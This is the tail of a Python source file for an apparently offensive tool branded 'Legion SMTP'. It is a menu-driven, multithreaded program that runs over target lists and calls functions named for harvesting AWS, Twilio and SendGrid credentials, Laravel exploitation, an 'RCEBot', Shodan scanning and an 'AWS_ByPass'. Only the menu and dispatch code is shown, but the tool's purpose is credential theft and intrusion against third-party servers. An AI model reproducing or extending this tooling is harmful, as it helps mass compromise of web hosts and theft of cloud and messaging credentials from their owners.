                        numthread = input("\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
                    except:
                        print("\tWrong thread number!")
                        exit()
            pool = ThreadPool(int(numthread))
            for url in readsplit:
                if "://" in url:
                    url = url
                else:
                    url = url
                if url.endswith('/'):
                    url = url[:-1]
                jagases = url
                try:
                    pool.add_task(legalegion3, url)
                except KeyboardInterrupt:
                    session = open(pid_restore, 'w')
                    cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
                    session.write(cfgsession)
                    session.close()
                    print("CTRL+C Detect, Session saved")
                    exit()
            pool.wait_completion()
            try:
                os.remove(pid_restore)
            except:
                pass
        elif choice == "3":
            try:
            	os.mkdir('CMS')
            except:
            	pass
            try:
            	os.mkdir('AWS_ByPass')
            except:
            	pass
            try:
                list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')
                print('''
                    1.MultiProcessing
                    2.ThreadPool
                ''')
                chosethrd = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\t\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(filter1, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLegion & BadBoy\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(filter1, listss)
            except:
                print('{}Wrong'.format(fr))
        elif choice == "4":
            try:
            	os.mkdir('CMS')
            except:
            	pass
            addapache()
        elif choice == "5":
            Targetssas = input("\033[32m With Thread?|\033[0m \033[36m[\033[33my\033[36m]\033[31m/\033[36m[\033[33mn\033[36m] ")
            if Targetssas == "y":
                jumlahkn = input("\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
                Leakixap(jumlahkn)
        elif choice == "6":
            try:
            	os.mkdir('Apache_Parse')
            except:
            	pass
            try:
                readlist = open(input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')).read()

            except:
            	print(f'{red}Something wrong{yl}!{res}')
            	exit()
            for i in readlist.split('\n'):
                get_aws(i)
        elif choice == "7":
            try:
            	os.mkdir('Twilio_Checker')
            except:
            	pass
            try:
            	os.mkdir('Apache_Parse')
            except:
            	pass
            try:
                readlist = open(input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')).read()

            except:
            	print(f'{red}Something wrong{yl}!{res}')
            	exit()
            for i in readlist.split('\n'):
                get_twilio2(i)
        elif choice == "8":
            try:
            	os.mkdir('Apache_Parse')
            except:
            	pass
            try:
                readlist = open(input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')).read()

            except:
            	print(f'{red}Something wrong{yl}!{res}')
            	exit()
            for i in readlist.split('\n'):
                get_sendgridp(i)
        elif choice == "9":
            try:
            	os.mkdir('Legion_AWS')
            except:
            	pass
            maina()







        elif choice == "0":
            printez()
            alege()



def alege():
    printez()
    while True:

        print(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Wich Bot you want use?{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        choice = input('')
        if choice == "1":
            screen_clear()
            printezlav()
            laravel6()
        elif choice == "2":
            screen_clear()
            RCEBot()
        elif choice == "3":
            screen_clear()
            printezapache()
            apache()
        elif choice == "4":
            screen_clear()
            SMSBot()
        elif choice == "5":
            screen_clear()
            CPBot()
        elif choice == "6":
            screen_clear()
            SHODANBot()
        elif choice == "7":
            screen_clear()
            if not os.path.exists("Utility"):
                os.mkdir("Utility")
            LegionBot()
        elif choice == "0":
            printez()
            alege()
alege()
